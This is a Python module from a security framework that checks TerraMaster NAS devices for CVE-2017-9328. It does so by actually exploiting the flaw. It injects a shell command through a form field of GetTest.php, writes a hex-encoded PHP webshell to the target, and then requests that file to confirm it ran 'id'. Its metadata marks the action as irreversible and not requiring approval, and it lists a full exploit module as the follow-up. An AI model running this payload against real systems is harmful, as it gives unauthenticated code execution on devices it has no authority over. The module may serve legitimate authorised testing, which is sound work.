#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""TerraMaster TOS GetTest.php unauthenticated RCE (CVE-2017-9328)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'TerraMaster TOS - GetTest.php RCE Detection (CVE-2017-9328)',
        'description': (
            'Detects CVE-2017-9328 by injecting a PHP webshell write via '
            '/include/ajax/GetTest.php and executing id.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2017', 'terramaster', 'nas', 'rce', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': False,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.5,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'risk_signal', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['exploits/linux/http/terramaster_cve_2017_9328_rce'],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2017-9328',
        ],
        'cve': 'CVE-2017-9328',
    }

    def run(self):
        fname = 'vt-test_cve_2017_9328.php'
        # <?php passthru("id"); unlink(__FILE__); ?>
        php_hex = (
            '\\x3c\\x3f\\x70\\x68\\x70\\x20\\x70\\x61\\x73\\x73\\x74\\x68\\x72\\x75\\x28\\x22'
            '\\x69\\x64\\x22\\x29\\x3b\\x20\\x75\\x6e\\x6c\\x69\\x6e\\x6b\\x28\\x5f\\x5f\\x46'
            '\\x49\\x4c\\x45\\x5f\\x5f\\x29\\x3b\\x20\\x3f\\x3e\\n'
        )
        data = (
            'dev=b1bebe&testtype=start;\\"'
            f'$(echo -en "{php_hex}" > {fname});'
        )
        r = self.http_request(
            method='POST',
            path='/include/ajax/GetTest.php',
            data=data,
            headers={'Content-Type': 'application/x-www-form-urlencoded'},
            allow_redirects=False,
        )
        if not r or 'Call to undefined function' not in (r.text or ''):
            return False
        g = self.http_request(
            method='GET', path=f'/include/ajax/{fname}', allow_redirects=False,
        )
        if g and re.search(r'uid=\d+.*gid=\d+', g.text or ''):
            self.set_info(
                severity='critical',
                reason='TerraMaster GetTest.php RCE (CVE-2017-9328)',
                path='/include/ajax/GetTest.php',
            )
            return True
        return False
